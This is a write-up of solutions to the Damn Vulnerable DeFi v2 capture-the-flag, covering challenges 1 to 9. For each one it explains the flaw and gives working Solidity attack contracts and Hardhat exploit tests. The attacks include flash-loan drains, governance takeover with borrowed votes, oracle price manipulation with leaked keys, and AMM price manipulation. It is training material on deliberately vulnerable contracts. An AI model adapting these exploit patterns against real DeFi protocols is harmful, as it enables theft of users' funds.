![](cover.png)

# Damn Vulnerable DeFi solutions (v2)

Challenges created by [@tinchoabbate](https://twitter.com/tinchoabbate) at [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/).

## 1 - Unstoppable

The goal of this challenge is to disable flash loan lender contract. We are looking for DoS attack.

Vulnerability is located inside **flashLoan()** function in **UnstoppableLender.sol** :

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);

  damnValuableToken.transfer(msg.sender, borrowAmount);

  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

In order to disable contract from offering flash loans, we need to break one of the 4 safety checks inside the function.

Particiullary interesting one:

```solidity
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

The assert statement is making sure that contract balance of DVT token (`balanceBefore`) is matching the inner contract logic balance (`poolBalance`) that is updated when user deposits tokens using `depositTokens` function.

It assumes that no external transfers will occur, which is a flawed assumption.

We can exploit this by transferring DVT tokens to contract with ERC20 `transfer` function.

Solution code:

**unstoppable.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
// ...
```

## 2 - Naive Receiver

This challange might be tricky at first. Goal is not to attack lender, rather we need to drain funds from receiver even though vulnerability is inside lender's contract.

**NaiveReceiverLenderPool.sol** is offering flash loans, but it always takes constant fee of **1 ether**.
There is nothing wrong with contract's logic, but the way it offers flash loans is not very secure.

As we can see from `flashLoan()` function:

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );

    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

It's clear that caller is specifying address of borrower as paramater. So, we can call `flashLoan()` and specify **flashLoanReceiver.sol**'s address as borrower, calling it 10 times would be enough to drain all funds from receiver since 1 loan costs 1 ether in fees.

We will make new **NaiveReceiverAttack.sol** contract that will essentially call `flashLoan()` 10 times with **flashLoanReceiver.sol**'s address as borrower paramater.

Solution code:

**NaiveReceiverAttack.sol :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool immutable pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) external {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}

```

**naive-receiver.challenge.js :**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'NaiveReceiverAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);
  await attackContract.attack(this.receiver.address);
});
// ...
```

## 3 - Truster

Again, we have a flash loan lender contract. Goal is to drain all the funds from the pool. It offers flash loans for free, but has one big flaw.

Here is the main function:

```solidity
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

As we can see logic seems fine, but `target` paramater and this line of code are critical to understand:

```solidity
target.functionCall(data);
```

It is very vulnerable external call. Essentially, pool is making call to `target` contract that **we** specify and it calls function that **we** specify with `data` paramater. Basically we can forward this call to any contract function with `msg.sender` being **pool** contract.

More specifically we will call **ERC20** token `approve` function and approve ourselves as spender of all pool's tokens. In order to perform this hack in one transaction we will make new **TrusterAttack.sol** contract that will make a malicous loan (approve it's address as pool tokens spender) and transfer all tokens from pool in same function call.

Solution code:

**TrusterAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
    TrusterLenderPool immutable pool;
    IERC20 immutable token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        pool.flashLoan(borrowAmount, borrower, target, data);
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
```

**truster.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE  */
  const AttackFactory = await ethers.getContractFactory(
    'TrusterAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.pool.address,
    this.token.address
  );

  const amount = 0;
  const borrower = attacker.address;
  const target = this.token.address;
  const abi = ['function approve(address spender, uint256 amount)'];
  const iface = new ethers.utils.Interface(abi);
  const data = iface.encodeFunctionData('approve', [
    attackContract.address,
    TOKENS_IN_POOL,
  ]);

  await attackContract.attack(amount, borrower, target, data);
});
// ...
```

## 4 - Side Entrance

This time our flash loan lender comes with additional funcitonality. It acts as a vault, so basically anyone can deposit their ether and withdraw at any time. Stacked ether is used to lend flash loans with no extra fees.

We will exploit this contract by taking advantage of insecure accounting logic. Let's take a look at `flashLoan` function.

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
}
```

Two requirements seem fine at first, but one scenairo hasn't been accounted for. Once we receive flash loan, nothing prevents us from returning the loan with pool's `deposit` function. That way, inside pool's accounting, we are the owners of deposited funds. Pool balance stayed the same, but inner logic is broken and we are able to withdraw everything.

For the solution, we will create new **SideEntranceAttack.sol** contract and implement the exploit.

Solution code:

**SideEntranceAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;
    address immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack(uint amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}
```

**side-entrance.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'SideEntranceAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);

  await attackContract.attack(ETHER_IN_POOL);
});
// ...
```

## 5 - The Rewarder

The Rewarder challange stepped up in complexity from previous challanges, it might be intimidating at first. We have 2 pools, **FlashLoanerPool.sol** offering flash loans, **TheRewarderPool.sol** offering reward tokens every 5 days to those who deposit DVT token. The goal is to win majority of rewards.

In order to beat the challenge we must own the majority of deposited reward pool liquidity tokens, and flash loan contract offers loans in.. you guessed it, DVT liquidity tokens!

**AccountingToken.sol** is used inside Reward pool for inside accounting logic to track who deposited what amount etc.

Let's take a look at **TheRewarderPool.sol**'s `deposit` function:

```solidity
function deposit(uint256 amountToDeposit) external {
    require(amountToDeposit > 0, "Must deposit tokens");

    accToken.mint(msg.sender, amountToDeposit);
    distributeRewards();

    require(
        liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
    );
}
```

As we can see pool distributes rewards each time we deposit liquidity tokens. The condition is though, it must have been 5 days from last time since you can get rewards once per round and each round lasts 5 days.

Finally, we will exploit this `deposit` function with flash loan from **FlashLoanerPool.sol**. We can deposit the loan in **TheRewarderPool.sol** and get most of rewards. Once we receive rewards, we will withdraw tokens and pay back the loan to lender.

To interact with flash loan lender we need smart contract that will orchestrate the above logic.

Solution code:

**TheRewarderAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {
    FlashLoanerPool immutable loanPool;
    TheRewarderPool immutable rewardPool;
    DamnValuableToken immutable liqToken;
    address payable immutable owner;

    constructor(address _loanPool, address _rewardPool, address _liqToken) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liqToken = DamnValuableToken(_liqToken);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liqToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liqToken.transfer(address(loanPool), amount);

        uint256 balance = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, balance);
    }
}
```

**the-rewarder.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'TheRewarderAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.flashLoanPool.address,
    this.rewarderPool.address,
    this.liquidityToken.address
  );
  // wait 5 days for new round
  await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);

  await attackContract.attack(TOKENS_IN_LENDER_POOL);
});
// ...
```

## 6 - Selfie

Goal of this challenge is to drain all funds from **SelfiePool.sol**. It looks kind of obvious here:

```solidity
function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
}
```

The tricky part is to pass `onlyGovernance` modifier that requires transaction sender to be **SimpleGovernance.sol** contract.
Governance contract is designed in a way that anyone can submit an action (transaction) and execute it if the action caller has enough votes. What it actually means is that we have to own more than half of total token supply. That is easy since we have lender that offers 75% of whole supply in flash loans.

So, to exploit this we will need new **SelfieAttack.sol** contract. It will request the flash loan and queue an action that calls **SelfiePool.sol's** `drainAllFunds`. After paying back the loan, we will wait for queued action to be available for execution since contract requires that at least 2 days have passed.

Solution code:

**SelfieAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool immutable pool;
    DamnValuableTokenSnapshot immutable governanceToken;
    address immutable owner;

    constructor(address _pool, address _governanceToken) {
        pool = SelfiePool(_pool);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        governanceToken.transfer(address(pool), amount);
    }
}
```

**selfie.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'SelfieAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.pool.address,
    this.token.address
  );
  await attackContract.attack();

  await ethers.provider.send('evm_increaseTime', [2 * 24 * 3600]);

  await this.governance.connect(attacker).executeAction(1);
});
```

## 7 - Compromised

Solution to this challenge is a litle bit random, I find it very confusing especially for beginners. It doesn't look like real life scenario, but it teaches you some new things, so let's get into it.

Firstly let's see the contracts. The main contract is **Exchange.sol**, it has simple utility, you can buy and sell NFT for price that is determined inside **TrustfulOracle.sol**. So, most likely we will manipulate the price somehow. The goal is to drain all funds from the exchange, we start with 0.01 eth. Now, if you take a closer look at **TrustfulOracle.sol**, the way it works is that in order to set the price you must have a special role. There is no obvious way to get that role since it's initialized in constructor. But, if you have looked at official instructions for this level on [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/), you would've noticed bunch of random confusing numbers.

As it turns out those are the 2 encoded private keys. You can decode them like this: HEX => ascii, ascii => base64. As a matter of fact those are the 2 private keys from trusted oracles, so we just need to find the way how to turn those keys in signer wallet with ethers.js and manipulate the price inside **TrustfulOracle.sol**. Firstly we'll set the price very low to buy, and then we'll set it to the whole balance of exchange so that once we sell we get all the funds.

Solution code:

**compromised.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const key1 =
    '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
  const key2 =
    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

  const oracle1 = new ethers.Wallet(key1, ethers.provider);
  const oracle2 = new ethers.Wallet(key2, ethers.provider);

  const orc1Trust = this.oracle.connect(oracle1);
  const orc2Trust = this.oracle.connect(oracle2);

  const setMedianPrice = async (amount) => {
    await orc1Trust.postPrice('DVNFT', amount);
    await orc2Trust.postPrice('DVNFT', amount);
  };

  let priceToSet = ethers.utils.parseEther('0.01');
  await setMedianPrice(priceToSet);

  const attackExchange = this.exchange.connect(attacker);
  const attackNFT = this.nftToken.connect(attacker);

  await attackExchange.buyOne({ value: priceToSet });

  const tokenId = 0;

  const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
  priceToSet = balOfExchange;
  await setMedianPrice(priceToSet);

  await attackNFT.approve(attackExchange.address, tokenId);
  await attackExchange.sellOne(tokenId);

  priceToSet = INITIAL_NFT_PRICE;
  await setMedianPrice(priceToSet);
});
```

## 8 - Puppet

Now, this challenge might look math intensive at first, but it's critical to understand these concepts because they are backbone of DEXs that utilize AMMs. Essentially we will solve the challenge with market manipulation. We will take advantage of the low liquidity inside Uniswap DVT pool.

The main contract is **PuppetPool.sol** that we need to drain funds from. In order to get all DVT tokens from pool, we have to strongly devalue DVT token so that required ETH deposit as collateral gets really low. Collateral is calculated based on DVT price that comes from UniSwap contract deployed earlier in the test.

Now, I wrote some comments inside solution script to help you understand what's going on. Long story short, UniSwap exchange for DVT token calculates 'price' of DVT based on ratio supplied in the pool. If there is a lot of DVT and less ETH, ETH becomes very valuable compared to DVT, and vice versa.

The main formula that drives this behaviour is: `X * Y = k`  
`X` is amount of ERC20 token (**DVT**)  
`Y` is amount of ETH  
`k` is the **constant** product, meaning that ratio will change in order to satisfy the product

I encorouge you to do your own research on AMMs and UniSwap v1 for better understanding.

Now, for the solution. Firstly we will deposit all available **DVT** in UniSwap exchange to strongly devalue the price. We will get around **9.9 ETH** for supplied DVT.
Then, we will be able to borrow 100k DVT from **PuppetPool.sol** with supplying just around 18 ETH as collateral. We can get 1000 DVT back from UniSwap exchange with depositting around 10 ETH.

Solution code:

**puppet.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  /**
   * AMM Formula: X * Y = k
   *
   * 1 - Devalue DVT by depositing 1000 tokens
   * 10 ETH : 10 DVT => k = 10 * 10 = 100
   * X ETH  : 1010 DVT => X = 100 / 1010 = 0.09901
   * We receive: 10 - 0.09901 = 9.90099 ETH
   *
   * 2 - borrow all DVT from the pool
   * 100000 DVT costs (0.09 / 1010) * 100000 * 2 = 17.8 ETH
   * We are left off with ~15 ETH + 100000 DVT
   *
   * 3 - put uniswap pool to original ratio
   * We put back 10 ETH which gives us 1000 DVT
   * Ratio: 10 ETH : 10 DVT
   */
  const attackPuppet = this.lendingPool.connect(attacker);
  const attackToken = this.token.connect(attacker);
  const attackUniSwap = this.uniswapExchange.connect(attacker);

  await attackToken.approve(
    attackUniSwap.address,
    ATTACKER_INITIAL_TOKEN_BALANCE
  );

  await attackUniSwap.tokenToEthSwapInput(
    ATTACKER_INITIAL_TOKEN_BALANCE,
    ethers.utils.parseEther('9'),
    (await ethers.provider.getBlock('latest')).timestamp * 2
  );

  const deposit = await attackPuppet.calculateDepositRequired(
    POOL_INITIAL_TOKEN_BALANCE
  );
  await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });

  const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
  const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack, {
    gasLimit: 1e6,
  });

  await attackUniSwap.ethToTokenSwapOutput(
    tokensToBuyBack,
    (await ethers.provider.getBlock('latest')).timestamp * 2,
    { value: ethReq }
  );
});
```

## 9 - Puppet v2

This challenge is very similiar to previous one, so I won't go in depth. Logic is exactly the same. It introduces UniSwap v2 contracts, so that might be interesting. Other than that, there is not much new happening.

The difference here is that there is no ETH/ERC20 pair, rather we have WETH/ERC20 pair. UniSwap v2 introduces ERC20/ERC20 pairs, and to make cleaner codebase they only allow using Wrapped ETH (WETH) which is just an ERC20 representation of ETH.

To exploit this, we will follow the same logic from 8. challenge (Puppet). Fistly, we deposit all available DVT in WETH/DVT pool to devalue it. Once that's done we will be able to borrow all funds from **PuppetV2Pool.sol**. But, there is a catch. We need to exchange ETH for WETH because lender pool requires WETH. So once we have WETH we'll be able to borrow whole DVT from **PuppetV2Pool.sol**.

Solution code:

**puppet-v2.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const attackWeth = this.weth.connect(attacker);
  const attackToken = this.token.connect(attacker);
  const attackRouter = this.uniswapRouter.connect(attacker);
  const attackLender = this.lendingPool.connect(attacker);

  await attackToken.approve(
    attackRouter.address,
    ATTACKER_INITIAL_TOKEN_BALANCE
  );
  await attackRouter.swapExactTokensForTokens(
    ATTACKER_INITIAL_TOKEN_BALANCE,
    ethers.utils.parseEther('9'),
    [attackToken.address, attackWeth.address],
    attacker.address,
    (await ethers.provider.getBlock('latest')).timestamp * 2
  );

  const deposit = await attackLender.calculateDepositOfWETHRequired(
    POOL_INITIAL_TOKEN_BALANCE
  );
  await attackWeth.approve(attackLender.address, deposit);

  const tx = {
    to: attackWeth.address,
    value: ethers.utils.parseEther('19.9'),
  };
  await attacker.sendTransaction(tx);

  await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
    gasLimit: 1e6,
  });
});
```
